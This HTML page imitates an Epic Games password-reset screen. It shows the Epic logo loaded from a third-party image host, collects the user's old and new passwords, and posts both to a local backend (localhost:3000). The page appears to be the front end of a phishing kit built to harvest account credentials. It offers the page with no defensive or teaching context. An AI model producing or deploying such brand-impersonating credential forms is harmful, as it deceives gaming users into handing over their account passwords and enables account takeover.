<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Epic Games Password Reset</title>
    <link rel="stylesheet" href="epicgames-html-password.css">
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap');

        body {
            background-color: #181818;
            color: #fff;
            font-family: 'Roboto', Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
        }

        .container {
            background-color: #242424;
            padding: 40px;
            border-radius: 12px;
            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.6);
            width: 400px;
            text-align: center;
        }

        .logo {
            margin-bottom: 20px;
        }

        .logo img {
            width: 100px;
            height: auto;
        }

        .MuiTypography-root {
            font-size: 18px;
            font-weight: 500;
            margin-bottom: 20px;
            letter-spacing: 0.5px;
            color: #f5f5f5;
        }

        .form-group {
            margin-bottom: 15px;
            position: relative;
        }

        .form-group label {
            display: block;
            margin-bottom: 5px;
            color: #ddd;
            font-size: 14px;
            font-weight: bold;
        }

        input[type="password"] {
            width: 100%;
            padding: 8px;
            border: 1px solid #444;
            border-radius: 6px;
            background-color: #333;
            color: #fff;
            font-size: 14px;
            font-weight: bold;
            outline: none;
        }

        input[type="password"]:focus {
            border-color: #007bff;
            box-shadow: 0 0 5px #007bff;
        }

        .show-password {
            position: absolute;
            top: 50%;
            right: 10px;
            transform: translateY(-50%);
            cursor: pointer;
            font-size: 16px;
            color: #bbb;
        }

        .show-password:hover {
            color: #fff;
        }

        .requirements {
            margin-top: 15px;
            border: 1px solid #444;
            border-radius: 6px;
            padding: 15px;
            background-color: #2a2a2a;
            font-size: 14px;
        }

        .requirements ul {
            margin: 0;
            padding: 0 0 0 20px;
            list-style: disc;
        }

        .requirements li {
            margin-bottom: 10px;
            color: #bbb;
        }

        button {
            background: linear-gradient(90deg, #007bff, #0056b3);
            color: #fff;
            border: none;
            padding: 10px;
            border-radius: 6px;
            cursor: pointer;
            font-weight: bold;
            width: 100%;
            font-size: 14px;
            letter-spacing: 0.5px;
            transition: transform 0.2s ease, box-shadow 0.2s ease;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
        }

        button:hover {
            transform: translateY(-2px);
            box-shadow: 0 6px 12px rgba(0, 0, 0, 0.3);
        }

        button:active {
            transform: translateY(1px);
            box-shadow: 0 3px 6px rgba(0, 0, 0, 0.2);
        }

        .spinner {
            display: none;
            border: 4px solid #f3f3f3;
            border-top: 4px solid #3498db;
            border-radius: 50%;
            width: 30px;
            height: 30px;
            animation: spin 1s linear infinite;
            margin-top: 10px;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <div class="container">
        <!-- Logo Section -->
        <div class="logo">
            <img src="https://i.ibb.co/PTf4kjw/epic-games-logo.jpg" alt="Epic Games Logo">
        </div>

        <!-- Instructions -->
        <div class="MuiTypography-root">
            Enter your new password for your Epic Games account.
        </div>

        <!-- Form Section -->
        <form id="resetForm">
            <!-- Old Password Section -->
            <div class="form-group">
                <label for="oldPassword">Old Password</label>
                <input type="password" id="oldPassword" name="oldPassword" placeholder="Enter your old password" required>
                <span class="show-password" onclick="togglePassword('oldPassword')">üëÅ</span>
            </div>

            <!-- New Password Section -->
            <div class="form-group">
                <label for="newPassword">New Password</label>
                <input type="password" id="newPassword" name="newPassword" placeholder="Enter your new password" required>
                <span class="show-password" onclick="togglePassword('newPassword')">üëÅ</span>
            </div>

            <!-- Password Requirements -->
            <div class="requirements">
                <strong>Password Requirements:</strong>
                <ul>
                    <li>Must not use any of your last 5 passwords</li>
                    <li>Must contain at least 7 characters</li>
                    <li>Must include at least 1 letter</li>
                    <li>Must include at least 1 number</li>
                    <li>Must not contain spaces</li>
                </ul>
            </div>

            <!-- Submit Button -->
            <button type="submit" id="submitBtn">Reset Password</button>
            <div class="spinner" id="loadingSpinner"></div>
        </form>
    </div>

    <script>
        // Toggle Password Visibility
        function togglePassword(fieldId) {
            const field = document.getElementById(fieldId);
            field.type = field.type === 'password' ? 'text' : 'password';
        }

        // Handle Form Submission
        document.getElementById('resetForm').addEventListener('submit', function(event) {
            event.preventDefault();  // Prevents the default form submission

            // Show the loading spinner
            document.getElementById('loadingSpinner').style.display = 'inline-block';
            document.getElementById('submitBtn').disabled = true;

            // Collect the password data
            const oldPassword = document.getElementById('oldPassword').value;
            const newPassword = document.getElementById('newPassword').value;

            // Submit the data to the backend using fetch
            fetch('http://localhost:3000/reset-password', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({ oldPassword, newPassword })
            })
            .then(response => response.text())
            .then(data => {
                // Hide the loading spinner
                document.getElementById('loadingSpinner').style.display = 'none';
                document.getElementById('submitBtn').disabled = false;

                // Show the success message
                alert(data);
                window.location.href = 'password-success.html';  // Redirect to a success page
            })
            .catch(error => {
                // Hide the loading spinner and re-enable the button in case of an error
                document.getElementById('loadingSpinner').style.display = 'none';
                document.getElementById('submitBtn').disabled = false;

                console.error('Error:', error);
                alert('Something went wrong. Please try again.');
            });
        });
    </script>
</body>
</html>
